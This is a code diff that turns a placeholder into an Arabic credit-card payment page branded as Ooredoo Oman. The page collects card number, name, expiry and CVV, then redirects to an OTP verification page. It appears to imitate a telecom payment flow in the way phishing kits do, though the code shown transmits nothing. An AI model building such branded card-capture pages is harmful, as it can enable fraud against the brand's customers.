@@ -4,20 +4,110 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>الدفع بالبطاقة الائتمانية | Ooredoo Oman</title>
-    <script>
-        // In a real scenario, this might redirect to a React route or handle the logic
-        console.log("Static placeholder for الدفع بالبطاقة الائتمانية");
-    </script>
     <style>
-        body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #f7f7f7; }
-        .card { background: white; padding: 2rem; border-radius: 1rem; box-shadow: 0 4px 6px rgba(0,0,0,0.1); text-align: center; }
-        h1 { color: #ed1c24; }
+        :root { --ooredoo-red: #ed1c24; --text: #222222; --muted: #666666; --line: #e5e5e5; }
+        * { box-sizing: border-box; }
+        body { margin: 0; font-family: Arial, sans-serif; background: #f7f7f7; color: var(--text); direction: rtl; }
+        .header { background: white; padding: 20px; text-align: center; border-bottom: 1px solid var(--line); }
+        .logo { color: var(--ooredoo-red); font-weight: 900; font-size: 30px; }
+        .container { max-width: 500px; margin: 40px auto; padding: 0 20px; }
+        .card { background: white; padding: 30px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.05); }
+        h1 { font-size: 22px; margin: 0 0 25px; text-align: center; }
+        .form-group { margin-bottom: 20px; }
+        label { display: block; margin-bottom: 8px; font-weight: bold; font-size: 14px; color: var(--muted); }
+        input, select { width: 100%; padding: 14px; border: 1px solid var(--line); border-radius: 12px; font-size: 16px; outline: none; transition: border-color 0.2s; }
+        input:focus { border-color: var(--ooredoo-red); }
+        .row { display: flex; gap: 15px; }
+        .row > div { flex: 1; }
+        .btn { width: 100%; padding: 16px; background: var(--ooredoo-red); color: white; border: none; border-radius: 999px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
+        .footer-logos { display: flex; justify-content: center; gap: 15px; margin-top: 30px; opacity: 0.6; }
+        .footer-logos img { height: 25px; }
+        .overlay { position: fixed; inset: 0; background: rgba(255,255,255,0.9); display: none; flex-direction: column; align-items: center; justify-content: center; z-index: 1000; }
+        .spinner { width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid var(--ooredoo-red); border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 15px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
-    <div class="card">
-        <h1>الدفع بالبطاقة الائتمانية</h1>
-        <p>هذه الصفحة قيد التطوير أو سيتم توجيهك قريباً.</p>
+    <div class="header"><div class="logo">Ooredoo</div></div>
+    <div class="container">
+        <div class="card">
+            <h1>تفاصيل البطاقة الائتمانية</h1>
+            <form id="payment-form">
+                <div class="form-group">
+                    <label>رقم البطاقة</label>
+                    <input type="text" id="card-number" placeholder="0000 0000 0000 0000" maxlength="19" required>
+                </div>
+                <div class="form-group">
+                    <label>اسم حامل البطاقة</label>
+                    <input type="text" id="card-name" placeholder="الاسم كما هو مكتوب على البطاقة" required>
+                </div>
+                <div class="row">
+                    <div class="form-group">
+                        <label>تاريخ الانتهاء</label>
+                        <div class="row" style="gap: 5px;">
+                            <select id="exp-month" required>
+                                <option value="">الشهر</option>
+                            </select>
+                            <select id="exp-year" required>
+                                <option value="">السنة</option>
+                            </select>
+                        </div>
+                    </div>
+                    <div class="form-group">
+                        <label>رمز التحقق (CVV)</label>
+                        <input type="password" id="cvv" placeholder="123" maxlength="3" required>
+                    </div>
+                </div>
+                <button type="submit" class="btn" id="submit-btn">دفع الآن</button>
+            </form>
+        </div>
+        <div class="footer-logos">
+            <img src="/assets/payment-logos/payment_visa.svg" alt="Visa">
+            <img src="/assets/payment-logos/payment_mastercard.svg" alt="Mastercard">
+        </div>
     </div>
+
+    <div class="overlay" id="loading-overlay">
+        <div class="spinner"></div>
+        <div id="loading-text">جاري معالجة العملية...</div>
+    </div>
+
+    <script>
+        const form = document.getElementById('payment-form');
+        const cardNumber = document.getElementById('card-number');
+        const overlay = document.getElementById('loading-overlay');
+        const expMonth = document.getElementById('exp-month');
+        const expYear = document.getElementById('exp-year');
+
+        for(let i=1; i<=12; i++) {
+            const opt = document.createElement('option');
+            opt.value = i.toString().padStart(2, '0');
+            opt.textContent = i.toString().padStart(2, '0');
+            expMonth.appendChild(opt);
+        }
+
+        const currentYear = new Date().getFullYear();
+        for(let i=0; i<15; i++) {
+            const opt = document.createElement('option');
+            opt.value = (currentYear + i).toString().slice(-2);
+            opt.textContent = currentYear + i;
+            expYear.appendChild(opt);
+        }
+
+        cardNumber.addEventListener('input', (e) => {
+            let value = e.target.value.replace(/\D/g, '');
+            let formatted = value.match(/.{1,4}/g)?.join(' ') || value;
+            e.target.value = formatted;
+        });
+
+        form.addEventListener('submit', (e) => {
+            e.preventDefault();
+            overlay.style.display = 'flex';
+            setTimeout(() => {
+                window.location.href = '/OTPVerification/?lang=ar';
+            }, 2000);
+        });
+    </script>
 </body>
 </html>
